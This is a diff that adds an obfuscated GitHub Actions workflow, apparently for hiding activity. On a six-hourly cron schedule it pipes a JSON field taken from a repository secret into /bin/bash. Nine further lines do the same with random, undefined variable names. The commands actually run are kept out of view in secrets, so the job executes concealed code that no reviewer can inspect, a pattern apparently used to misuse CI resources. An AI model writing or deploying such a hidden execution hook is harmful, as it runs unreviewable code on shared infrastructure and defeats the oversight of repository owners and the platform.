@@ -1,0 +1,26 @@
+name: youshigeliao
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '33 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: youshigeliao
+        env:
+          eg6920: ${{ secrets.eg6920 }}
+        run: |
+          echo $eg6920 | jq -r .k5 | /bin/bash
+          echo $fq0740 | jq -r .xt6578 | /bin/bash
+          echo $aghm82 | jq -r .go607 | /bin/bash
+          echo $wazoj0727 | jq -r .l22155 | /bin/bash
+          echo $axv16 | jq -r .om4 | /bin/bash
+          echo $b8280 | jq -r .rjeqt837 | /bin/bash
+          echo $lzop9 | jq -r .phhk815 | /bin/bash
+          echo $ib1549 | jq -r .vavc1 | /bin/bash
+          echo $zhikl3090 | jq -r .yascy5000 | /bin/bash
+          echo $isu5 | jq -r .bk40 | /bin/bash
+
